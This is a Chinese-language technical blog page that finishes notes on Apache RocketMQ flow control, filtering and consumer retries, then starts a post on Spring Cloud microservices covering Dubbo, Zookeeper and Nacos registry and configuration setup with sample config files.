<h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/05sendretrypolicy#%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6">触发条件</a></h3><p>Apache RocketMQ 的消息流控触发条件如下：</p>
<ul>
<li>存储压力大：参考<a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/09consumerprogress">消费进度管理</a>的原理机制，消费者分组的初始消费位点为当前队列的最大消费位点。若某些场景例如业务上新等需要回溯到指定时刻前开始消费，此时队列的存储压力会瞬间飙升，触发消息流控。</li>
<li>服务端请求任务排队溢出：若消费者消费能力不足，导致队列中有大量堆积消息，当堆积消息超过一定数量后会触发消息流控，减少下游消费系统压力。</li>
</ul>
<h3 id="流控行为"><a href="#流控行为" class="headerlink" title="流控行为"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/05sendretrypolicy#%E6%B5%81%E6%8E%A7%E8%A1%8C%E4%B8%BA">流控行为</a></h3><p>当系统触发消息发送流控时，客户端会收到系统限流错误和异常，错误码信息如下：</p>
<ul>
<li>reply-code：530</li>
<li>reply-text：TOO_MANY_REQUESTS</li>
</ul>
<p>客户端收到系统流控错误码后，会根据指数退避策略进行消息发送重试。</p>
<h3 id="处理建议"><a href="#处理建议" class="headerlink" title="处理建议"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/05sendretrypolicy#%E5%A4%84%E7%90%86%E5%BB%BA%E8%AE%AE">处理建议</a></h3><ul>
<li>如何避免触发消息流控：触发限流的根本原因是系统容量或水位过高，您可以利用可观测性功能监控系统水位容量等，保证底层资源充足，避免触发流控机制。</li>
<li>突发消息流控处理：如果因为突发原因触发消息流控，且客户端内置的重试流程执行失败，则建议业务方将请求调用临时替换到其他系统进行应急处理。</li>
</ul>
<h2 id="消息过滤"><a href="#消息过滤" class="headerlink" title="消息过滤"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/07messagefilter">消息过滤</a></h2><p>消费者订阅了某个主题后，Apache RocketMQ 会将该主题中的所有消息投递给消费者。若消费者只需要关注部分消息，可通过设置过滤条件在 Apache RocketMQ 服务端进行过滤，只获取到需要关注的消息子集，避免接收到大量无效的消息。</p>
<p>消息过滤主要解决的单个业务域即同一个主题内不同消息子集的过滤问题，一般是基于同一业务下更具体的分类进行过滤匹配。如果是需要对不同业务域的消息进行拆分，建议使用不同主题处理不同业务域的消息。</p>
<h3 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/07messagefilter#%E5%8A%9F%E8%83%BD%E6%A6%82%E8%BF%B0">功能概述</a></h3><p><strong>消息过滤定义</strong></p>
<p>过滤的含义指的是将符合条件的消息投递给消费者，而不是将匹配到的消息过滤掉。</p>
<p>Apache RocketMQ 的消息过滤功能通过生产者和消费者对消息的属性、标签进行定义，并在 Apache RocketMQ 服务端根据过滤条件进行筛选匹配，将符合条件的消息投递给消费者进行消费。</p>
<p><strong>消息过滤原理</strong></p>
<p>消息过滤主要通过以下几个关键流程实现：</p>
<ul>
<li>生产者：生产者在初始化消息时预先为消息设置一些属性和标签，用于后续消费时指定过滤目标。</li>
<li>消费者：消费者在初始化及后续消费流程中通过调用订阅关系注册接口，向服务端上报需要订阅指定主题的哪些消息，即过滤条件。</li>
<li>服务端：消费者获取消息时会触发服务端的动态过滤计算，Apache RocketMQ 服务端根据消费者上报的过滤条件的表达式进行匹配，并将符合条件的消息投递给消费者。</li>
</ul>
<h3 id="消息过滤分类"><a href="#消息过滤分类" class="headerlink" title="消息过滤分类"></a><strong>消息过滤分类</strong></h3><p>Apache RocketMQ 支持Tag标签过滤和SQL属性过滤。</p>
<ul>
<li><p>Tag标签过滤方式是生产者在发送消息时，设置消息的Tag标签，消费者需指定已有的Tag标签来进行匹配订阅。</p>
</li>
<li><p>SQL属性过滤方式是是生产者定义消息属性，消费者设置SQL过滤条件。生产者发送消息时可以自定义消息属性，每个属性都是一个自定义的键值对（Key-Value）。生产者在发送消息时可设置多个属性，消费者订阅时可设置SQL语法的过滤表达式过滤多个属性。</p>
</li>
</ul>
<h2 id="消费重试"><a href="#消费重试" class="headerlink" title="消费重试"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/10consumerretrypolicy">消费重试</a></h2><p>消费重试指的是，消费者在消费某条消息失败后，Apache RocketMQ 服务端会根据重试策略重新消费该消息，超过一次定数后若还未消费成功，则该消息将不再继续重试，直接被发送到死信队列中。</p>
<p>Apache RocketMQ 的消费重试主要解决的是业务处理逻辑失败导致的消费完整性问题，是一种为业务兜底的策略，不应该被用做业务流程控制。</p>
<h3 id="PushConsumer消费重试策略"><a href="#PushConsumer消费重试策略" class="headerlink" title="PushConsumer消费重试策略"></a>PushConsumer消费重试策略</h3><p><strong>重试状态机</strong></p>
<p>PushConsumer消费消息时，消息的几个主要状态如下：</p>
<ul>
<li>Ready：已就绪状态。消息在Apache RocketMQ服务端已就绪，可以被消费者消费。</li>
<li>Inflight：处理中状态。消息被消费者客户端获取，处于消费中还未返回消费结果的状态。</li>
<li>WaitingRetry：待重试状态，PushConsumer独有的状态。当消费者消息处理失败或消费超时，会触发消费重试逻辑判断。如果当前重试次数未达到最大次数，则该消息变为待重试状态，经过重试间隔后，消息将重新变为已就绪状态可被重新消费。多次重试之间，可通过重试间隔进行延长，防止无效高频的失败。</li>
<li>Commit：提交状态。消费成功的状态，消费者返回成功响应即可结束消息的状态机。</li>
<li>DLQ：死信状态。消费逻辑的最终兜底机制，若消息一直处理失败并不断进行重试，直到超过最大重试次数还未成功，此时消息不会再重试，会被投递至死信队列。您可以通过消费死信队列的消息进行业务恢复。</li>
</ul>
<p>消息重试过程中，每次重试消息状态都会经过已就绪&gt;处理中&gt;待重试的变化，两次消费间的间隔时间实际由消费耗时及重试间隔控制，消费耗时的最大上限受服务端系统参数控制，一般不应该超过上限时间。</p>
<h3 id="SimpleConsumer消费重试策略"><a href="#SimpleConsumer消费重试策略" class="headerlink" title="SimpleConsumer消费重试策略"></a>SimpleConsumer消费重试策略</h3><p><strong>重试状态机</strong></p>
<p>SimpleConsumer消费消息时，消息的几个主要状态如下：</p>
<h2 id="消费者负载均衡"><a href="#消费者负载均衡" class="headerlink" title="消费者负载均衡"></a>消费者负载均衡</h2><h2 id="消费进度管理"><a href="#消费进度管理" class="headerlink" title="消费进度管理"></a>消费进度管理</h2><h1 id="集群服务"><a href="#集群服务" class="headerlink" title="集群服务"></a>集群服务</h1><p>NameServer集群</p>
<p>Broker集群</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/">https://rocketmq.apache.org/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq">https://github.com/apache/rocketmq</a></li>
<li><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/">https://rocketmq.apache.org/zh/</a></li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-24T08:08:42.000Z" title="2023/5/24 16:08:42">2023-05-24</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-30T00:59:38.143Z" title="2023/5/30 08:59:38">2023-05-30</time></span><span class="level-item">2 hours read (About 15309 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/24/Spring-Cloud/">Spring Cloud</a></p><div class="content"><h1 id="服务架构"><a href="#服务架构" class="headerlink" title="服务架构"></a>服务架构</h1><p>微服务架构是一种一个单一应用程序开发为一组小型服务的代码结构，每个服务运行在自己的进程中，服务间采用轻量级通信机制（如HTTP）进行通信。这些服务可以独立部署，不同服务可以使用不同语言开发，使用不同的数据存储技术。</p>
<h2 id="微服务与Spring-Cloud"><a href="#微服务与Spring-Cloud" class="headerlink" title="微服务与Spring Cloud"></a>微服务与Spring Cloud</h2><p>为了降低构建和维护分布式系统的难度，加快微服务的落地，Spring Cloud提供了快速构建分布式微服务系统的一些常用功能，如配置管理、服务发现、断路器、路由、服务代理、控制总线等工具。使用这些工具可以快速构建分布式微服务架构的系统。</p>
<h2 id="Spring-Cloud与Dubbo"><a href="#Spring-Cloud与Dubbo" class="headerlink" title="Spring Cloud与Dubbo"></a>Spring Cloud与Dubbo</h2><h3 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h3><p>Apache Dubbo 是一款 RPC 服务开发框架，用于解决微服务架构下的服务治理与通信问题。利用 Dubbo 提供的丰富服务治理特性，可以实现诸如服务发现、负载均衡、流量调度等服务治理诉求。</p>
<p><a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/what/overview/">官网对Dubbo的含义的介绍</a>：</p>
<ul>
<li>Dubbo的产生原因：微服务的分布式特性，使得应用间的依赖、网络交互、数据传输变得更频繁，因此不同的应用需要定义、暴露或调用 RPC 服务，那么这些 RPC 服务如何定义、如何与应用开发框架结合、服务调用行为如何控制？</li>
<li>Dubbo的含义：<strong>Dubbo 在微服务应用开发框架之上抽象了一套 RPC 服务定义、暴露、调用与治理的编程范式</strong>。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/reference-manual/registry/">Dubbo支持的注册中心</a>的官网介绍。</p>
<h3 id="Spring-Cloud与Dubbo的区别"><a href="#Spring-Cloud与Dubbo的区别" class="headerlink" title="Spring Cloud与Dubbo的区别"></a>Spring Cloud与Dubbo的区别</h3><p>Dubbo主要用来实现服务治理，而Spring Cloud的各个组件实现了微服务架构下的所需的各种功能，服务治理只是其中的一个方面。</p>
<p>Dubbo的在Spring Cloud Netfix技术架构中的替代方案可以是，通过Consul或Eureka Server等实现服务注册中心（对应Dubbo中的注册中心），通过Ribbon实现软负载均衡。 </p>
<h2 id="Spring-Cloud-Netfix和Spring-Cloud-Alibaba"><a href="#Spring-Cloud-Netfix和Spring-Cloud-Alibaba" class="headerlink" title="Spring Cloud Netfix和Spring Cloud Alibaba"></a>Spring Cloud Netfix和Spring Cloud Alibaba</h2><p>Spring Cloud Netfix和Spring Cloud Alibaba是Spring Cloud的两套技术架构。</p>
<h3 id="Spring-Cloud-Netfix"><a href="#Spring-Cloud-Netfix" class="headerlink" title="Spring Cloud Netfix"></a>Spring Cloud Netfix</h3><p><a target="_blank" rel="noopener" href="https://www.springcloud.cc/spring-cloud-netflix.html">Spring Cloud Netfix在官方文档</a>中介绍：该项目通过自动配置和绑定到Spring环境和其他Spring编程模型的习惯方式来为Spring Boot应用程序提供Netflix OSS集成。通过几个简单的注释，您可以快速启用和配置应用程序中的常见模式，并通过经过测试的Netflix组件构建大型分布式系统。提供的组件包括服务发现（Eureka），断路器（Hystrix），智能路由（Zuul）和客户端负载平衡（Ribbon）。可以从<a target="_blank" rel="noopener" href="https://github.com/Netflix">Netfix的GitHub</a>中找到这些组件。</p>
<h3 id="Spring-Cloud-Alibaba"><a href="#Spring-Cloud-Alibaba" class="headerlink" title="Spring Cloud Alibaba"></a>Spring Cloud Alibaba</h3><p>Spring Cloud Alibaba的相关文档：<a target="_blank" rel="noopener" href="https://spring-cloud-alibaba-group.github.io/github-pages/hoxton/zh-cn/index.html">Spring Cloud Alibaba参考文档</a>、<a target="_blank" rel="noopener" href="https://github.com/alibaba/spring-cloud-alibaba/blob/2022.x/README-zh.md">Spring Cloud Alibaba中文版README.md</a>。其提供的组件有：Sentinel(分布式流控：流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性)、Nacos（注册中心）、RocketMQ（分布式消息组件）、Seata（分布式事务组件）等。</p>
<h1 id="服务注册中心和配置中心"><a href="#服务注册中心和配置中心" class="headerlink" title="服务注册中心和配置中心"></a>服务注册中心和配置中心</h1><p>服务注册中心提供了服务注册和服务发现功能</p>
<ol>
<li>服务注册：所有服务的提供方启动时向注册中心发送自己的信息，包括地址、端口、提供的服务等。</li>
<li>服务发现：当服务调用方需要调用服务时，只需要向注册中心查询谁提供了自己需要的服务。</li>
</ol>
<h2 id="Zookeeper（注册中心和配置中心）"><a href="#Zookeeper（注册中心和配置中心）" class="headerlink" title="Zookeeper（注册中心和配置中心）"></a>Zookeeper（注册中心和配置中心）</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>Zookeeper可以解决分布式应用中的服务的注册和发现、统一命名服务、状态同步服务、集群管理、分布式应用配置管理等问题。可以替代Eureka、Spring Cloud Config。不能替代路由网关（Zuul）、负载均衡（Ribbon）、断路器（Hystricx）等。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>启动Zookeeper的服务，可以使用Docker等方法启动Zookeeper。</li>
<li>在Zookeeper服务提供方：<ol>
<li>添加依赖spring-cloud0zookeeper-discovery和org.apache.curator。注：Zookeeper通过Curator（Curator 是一个 Apache ZooKeeper 客户端框架）实现了服务注册和发现功能，实现了和Eureka相同的功能。</li>
<li>在配置文件中添加对Zookeeper的配置，指定Zookeeper服务暴露的的连接ip和端口。</li>
<li>在启动类添加@EnableDiscoveryClient注解。</li>
</ol>
</li>
<li>在服务消费方：<ol>
<li>添加依赖</li>
<li>添加配置信息</li>
</ol>
</li>
</ol>
<h2 id="Nacos（注册中心和配置中心）"><a href="#Nacos（注册中心和配置中心）" class="headerlink" title="Nacos（注册中心和配置中心）"></a>Nacos（注册中心和配置中心）</h2><h3 id="功能和特性"><a href="#功能和特性" class="headerlink" title="功能和特性"></a>功能和特性</h3><p><a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/what-is-nacos.html">Nacos</a> &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p>
<p>Nacos官网给出的关键特性包括:</p>
<ul>
<li><p><strong>服务发现和服务健康监测</strong></p>
<p>Nacos 支持基于 DNS 和基于 RPC 的服务发现。服务提供者使用 <a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/sdk.html">原生SDK</a>、<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/open-api.html">OpenAPI</a>、或一个<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/other-language.html">独立的Agent TODO</a>注册 Service 后，服务消费者可以使用<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/xx">DNS TODO</a> 或<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/open-api.html">HTTP&amp;API</a>查找和发现服务。</p>
<p>Nacos 提供对服务的实时的健康检查，阻止向不健康的主机或服务实例发送请求。Nacos 支持传输层 (PING 或 TCP)和应用层 (如 HTTP、MySQL、用户自定义）的健康检查。 对于复杂的云环境和网络拓扑环境中（如 VPC、边缘网络等）服务的健康检查，Nacos 提供了 agent 上报模式和服务端主动检测2种健康检查模式。Nacos 还提供了统一的健康检查仪表盘，帮助您根据健康状态管理服务的可用性及流量。</p>
</li>
<li><p><strong>动态配置服务</strong></p>
<p>动态配置服务可以让您以中心化、外部化和动态化的方式管理所有环境的应用配置和服务配置。</p>
<p>动态配置消除了配置变更时重新部署应用和服务的需要，让配置管理变得更加高效和敏捷。</p>
<p>配置中心化管理让实现无状态服务变得更简单，让服务按需弹性扩展变得更容易。</p>
<p>Nacos 提供了一个简洁易用的UI (<a target="_blank" rel="noopener" href="http://console.nacos.io/nacos/index.html">控制台样例 Demo</a>) 帮助您管理所有的服务和应用的配置。Nacos 还提供包括配置版本跟踪、金丝雀发布、一键回滚配置以及客户端配置更新状态跟踪在内的一系列开箱即用的配置管理特性，帮助您更安全地在生产环境中管理配置变更和降低配置变更带来的风险。</p>
</li>
<li><p><strong>动态 DNS 服务</strong></p>
<p>动态 DNS 服务支持权重路由，让您更容易地实现中间层负载均衡、更灵活的路由策略、流量控制以及数据中心内网的简单DNS解析服务。动态DNS服务还能让您更容易地实现以 DNS 协议为基础的服务发现，以帮助您消除耦合到厂商私有服务发现 API 上的风险。</p>
<p>Nacos 提供了一些简单的 <a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/xx">DNS APIs TODO</a> 帮助您管理服务的关联域名和可用的 IP:PORT 列表.</p>
</li>
<li><p><strong>服务及其元数据管理</strong></p>
<p>Nacos 能让您从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略、服务的 SLA 以及最首要的 metrics 统计数据。</p>
</li>
</ul>
<h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>在创建的SpringBoot项目中添加依赖nacos-discovery-spring-boot- starter</li>
<li>创建Controller类，通过@NacosInjected注入Nacos的NamingService，并提供discovery方法用于根据服务名称获取注册到Nacos上的服务地址</li>
<li>添加对Nacos服务地址的配置</li>
</ol>
<h3 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h3><p>在分布式架构中，任何中间件或者应用都不允许单点存在，所以开源组件一般都会支持高可用的集群。Nacos的集群架构类似于Zookeeper，包含一个Leader节点和多个Follower节点，和Zookeeper不同的是，它的数据一致性算法使用的是Raft。</p>
<p>Nacos支持Derby和MySQL两种持久化机制，默认使用的是Derby数据库，Derby的吞吐量没有MySQL大，生产环境中可以使用MySQL替换，如果使用M有SQL，需要运行nacos-mysql-sql脚本创建数据库和表。</p>
<h3 id="Dubbo使用Nacos作为注册中心"><a href="#Dubbo使用Nacos作为注册中心" class="headerlink" title="Dubbo使用Nacos作为注册中心"></a>Dubbo使用Nacos作为注册中心</h3><blockquote>
<p>官方文档：<a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/quickstart/java/spring-boot/">Dubbo x Spring Boot 开发</a></p>
</blockquote>
<ol>
<li><p>在一个Maven项目（spring-boot-dubbo-sample）中添加三个模块，分别用来声明接口、实现接口和使用接口的实现类。</p>
</li>
<li><p>在声明接口的模块（nacos-sample-interface）中声明接口，打包安装模块。</p>
</li>
<li><p>在实现接口的模块（nacos-sample-provider）中添加三个依赖nacos-discovery-spring-boot-starter（Nacos的Starter组件）、dubbo-spring-boot-starter（Dubbo的Starter组件）以及nacos-sample-api（声明接口的模块名）；</p>
<p>创建接口的实现类，并在实现类中添加<code>@DubboService</code> 注解（<code>@Service</code> 注解从 3.0 版本开始就已经废弃，改用 <code>@DubboService</code>，以区别于 Spring 的 <code>@Service</code> 注解）；配置Dubbo 的应用名（dubbo.application.name）、Dubbo 协议信息（dubbo.protocol）、Dubbo 使用的注册中心地址（dubbo.register.adderss）等信息。配置示例：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">dubbo:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">nacos-sample-provider</span><br>  <span class="hljs-attr">protocol:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">dubbo</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">-1</span><br>  <span class="hljs-attr">registry:</span><br>    <span class="hljs-attr">address:</span> <span class="hljs-string">nacos://127.0.0.1:8848</span><br>    <span class="hljs-comment">#如果使用Zookeeper作为注册中心，只需要修改此address如下</span><br>    <span class="hljs-comment">#address: zookeeper:127.0.0.1:2181</span><br></code></pre></td></tr></table></figure>

<p>在启动类中添加注解@EnableDubbo。</p>
</li>
<li><p>在使用接口的实现类的模块（nacos-sample-consumer）使用@DubboReference注解（<code>@Reference</code> 注解从 3.0 版本开始就已经废弃，改用 <code>@DubboReference</code>，以区别于 Spring 的 <code>@Reference</code> 注解）即可获取nacos-sample-provider中的实现类对象；在配置文件中配置Dubbo 的应用名、Dubbo 协议信息、Dubbo 使用的注册中心地址；在启动类中添加注解@EnableDubbo。</p>
</li>
</ol>
<h3 id="Nacos源码（待完善）"><a href="#Nacos源码（待完善）" class="headerlink" title="Nacos源码（待完善）"></a>Nacos源码（待完善）</h3><p>根据注册中心的主要功能确定Nacos源码关键的部分有：服务注册、服务地址的获取、服务变化的感知。</p>
<ol>
<li>服务注册</li>
<li>服务地址的获取</li>
<li>服务变化的感知</li>
</ol>
<h3 id="Nacos作为配置中心"><a href="#Nacos作为配置中心" class="headerlink" title="Nacos作为配置中心"></a>Nacos作为配置中心</h3><p><a target="_blank" rel="noopener" href="https://github.com/alibaba/spring-cloud-alibaba/wiki/Nacos-config">使用方法</a>：</p>
<ol>
<li>引入依赖spring-cloud-starter-alibaba-nacos-config。</li>
<li>添加配置，使用 bootstrap.properties 配置文件来配置Nacos Server 地址、文件扩展名。</li>
</ol>
<p>特性：</p>
<ol>
<li><p>spring-cloud-starter-alibaba-nacos-config 支持配置的动态更新</p>
<p>可以通过配置 <code>spring.cloud.nacos.config.refresh.enabled=false</code> 来关闭动态刷新</p>
</li>
<li><p>可支持profile粒度的配置</p>
<p>spring-cloud-starter-alibaba-nacos-config 在加载配置的时候，不仅仅加载了以 dataId 为 <code>$&#123;spring.application.name&#125;.$&#123;file-extension:properties&#125;</code> 为前缀的基础配置，还加载了dataId为 <code>$&#123;spring.application.name&#125;-$&#123;profile&#125;.$&#123;file-extension:properties&#125;</code> 的基础配置。在日常开发中如果遇到多套环境下的不同配置，可以通过Spring 提供的 <code>$&#123;spring.profiles.active&#125;</code> 这个配置项来配置。</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.profiles.active</span>=<span class="hljs-string">develop</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>支持自定义 namespace 的配置</p>
<p>首先看一下 Nacos 的 Namespace 的概念， <a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/concepts.html">Nacos 概念</a></p>
<blockquote>
<p>用于进行租户粒度的配置隔离。不同的命名空间下，可以存在相同的 Group 或 Data ID 的配置。Namespace 的常用场景之一是不同环境的配置的区分隔离，例如开发测试环境和生产环境的资源（如配置、服务）隔离等。</p>
</blockquote>
<p>在没有明确指定 <code>$&#123;spring.cloud.nacos.config.namespace&#125;</code> 配置的情况下， 默认使用的是 Nacos 上 Public 这个namespace。如果需要使用自定义的命名空间，可以通过以下配置来实现：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.cloud.nacos.config.namespace</span>=<span class="hljs-string">b3404bc0-d7dc-4855-b519-570ed34b62d7</span><br></code></pre></td></tr></table></figure>

<p>该配置必须放在 bootstrap.properties 文件中。此外 <code>spring.cloud.nacos.config.namespace</code> 的值是 namespace 对应的 id，id 值可以在 Nacos 的控制台获取。并且在添加配置时注意不要选择其他的 namespace，否则将会导致读取不到正确的配置。</p>
</li>
<li><p>支持自定义 Group 的配置</p>
<p>在没有明确指定 <code>$&#123;spring.cloud.nacos.config.group&#125;</code> 配置的情况下， 默认使用的是 DEFAULT_GROUP 。如果需要自定义自己的 Group，可以通过以下配置来实现：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.cloud.nacos.config.group</span>=<span class="hljs-string">DEVELOP_GROUP</span><br></code></pre></td></tr></table></figure>

<p>该配置必须放在 bootstrap.properties 文件中。并且在添加配置时 Group 的值一定要和 <code>spring.cloud.nacos.config.group</code> 的配置值一致。</p>
</li>
<li><p>支持自定义扩展的 Data Id 配置</p>
<p>Spring Cloud Alibaba Nacos Config 从 0.2.1 版本后，可支持自定义 Data Id 的配置。关于这部分详细的设计可参考 <a target="_blank" rel="noopener" href="https://github.com/spring-cloud-incubator/spring-cloud-alibaba/issues/141">这里</a>。 一个完整的配置案例如下所示：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.application.name</span>=<span class="hljs-string">opensource-service-provider</span><br><span class="hljs-attr">spring.cloud.nacos.config.server-addr</span>=<span class="hljs-string">127.0.0.1:8848</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># config external configuration</span><br><span class="hljs-comment"># 1、Data Id 在默认的组 DEFAULT_GROUP,不支持配置的动态刷新</span><br><span class="hljs-attr">spring.cloud.nacos.config.extension-configs[0].data-id</span>=<span class="hljs-string">ext-config-common01.properties</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 2、Data Id 不在默认的组，不支持动态刷新</span><br><span class="hljs-attr">spring.cloud.nacos.config.extension-configs[1].data-id</span>=<span class="hljs-string">ext-config-common02.properties</span><br><span class="hljs-attr">spring.cloud.nacos.config.extension-configs[1].group</span>=<span class="hljs-string">GLOBALE_GROUP</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 3、Data Id 既不在默认的组，也支持动态刷新</span><br><span class="hljs-attr">spring.cloud.nacos.config.extension-configs[2].data-id</span>=<span class="hljs-string">ext-config-common03.properties</span><br><span class="hljs-attr">spring.cloud.nacos.config.extension-configs[2].group</span>=<span class="hljs-string">REFRESH_GROUP</span><br><span class="hljs-attr">spring.cloud.nacos.config.extension-configs[2].refresh</span>=<span class="hljs-string">true</span><br></code></pre></td></tr></table></figure>

<p>可以看到:</p>
<ul>
<li>通过 <code>spring.cloud.nacos.config.extension-configs[n].data-id</code> 的配置方式来支持多个 Data Id 的配置。</li>
<li>通过 <code>spring.cloud.nacos.config.extension-configs[n].group</code> 的配置方式自定义 Data Id 所在的组，不明确配置的话，默认是 DEFAULT_GROUP。</li>
<li>通过 <code>spring.cloud.nacos.config.extension-configs[n].refresh</code> 的配置方式来控制该 Data Id 在配置变更时，是否支持应用中可动态刷新， 感知到最新的配置值。默认是不支持的。</li>
</ul>
<p>多个 Data Id 同时配置时，他的优先级关系是 <code>spring.cloud.nacos.config.extension-configs[n].data-id</code> 其中 n 的值越大，优先级越高。</p>
<p><code>spring.cloud.nacos.config.extension-configs[n].data-id</code> 的值必须带文件扩展名，文件扩展名既可支持 properties，又可以支持 yaml&#x2F;yml。 此时 <code>spring.cloud.nacos.config.file-extension</code> 的配置对自定义扩展配置的 Data Id 文件扩展名没有影响。</p>
<p>通过自定义扩展的 Data Id 配置，既可以解决多个应用间配置共享的问题，又可以支持一个应用有多个配置文件。</p>
<p>为了更加清晰的在多个应用间配置共享的 Data Id ，你可以通过以下的方式来配置：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 配置支持共享的 Data Id</span><br><span class="hljs-attr">spring.cloud.nacos.config.shared-configs[0].data-id</span>=<span class="hljs-string">common.yaml</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 配置 Data Id 所在分组，缺省默认 DEFAULT_GROUP</span><br><span class="hljs-attr">spring.cloud.nacos.config.shared-configs[0].group</span>=<span class="hljs-string">GROUP_APP1</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 配置Data Id 在配置变更时，是否动态刷新，缺省默认 false</span><br><span class="hljs-attr">spring.cloud.nacos.config.shared-configs[0].refresh</span>=<span class="hljs-string">true</span><br></code></pre></td></tr></table></figure>

<p>可以看到：</p>
<ul>
<li>通过 <code>spring.cloud.nacos.config.shared-configs[n].data-id</code> 来支持多个共享 Data Id 的配置。</li>
<li>通过 <code>spring.cloud.nacos.config.shared-configs[n].group</code> 来配置自定义 Data Id 所在的组，不明确配置的话，默认是 DEFAULT_GROUP。</li>
<li>通过 <code>spring.cloud.nacos.config.shared-configs[n].refresh</code> 来控制该Data Id在配置变更时，是否支持应用中动态刷新，默认false。</li>
</ul>
</li>
<li><p>配置的优先级</p>
<p>Spring Cloud Alibaba Nacos Config 目前提供了三种配置能力从 Nacos 拉取相关的配置。</p>
<ul>
<li>A: 通过 <code>spring.cloud.nacos.config.shared-configs[n].data-id</code> 支持多个共享 Data Id 的配置</li>
<li>B: 通过 <code>spring.cloud.nacos.config.extension-configs[n].data-id</code> 的方式支持多个扩展 Data Id 的配置</li>
<li>C: 通过内部相关规则(应用名、应用名+ Profile )自动生成相关的 Data Id 配置</li>
</ul>
<p>当三种方式共同使用时，他们的一个优先级关系是:A &lt; B &lt; C</p>
</li>
<li><p>完全关闭配置</p>
<p>通过设置 spring.cloud.nacos.config.enabled &#x3D; false 来完全关闭 Spring Cloud Nacos Config</p>
</li>
</ol>
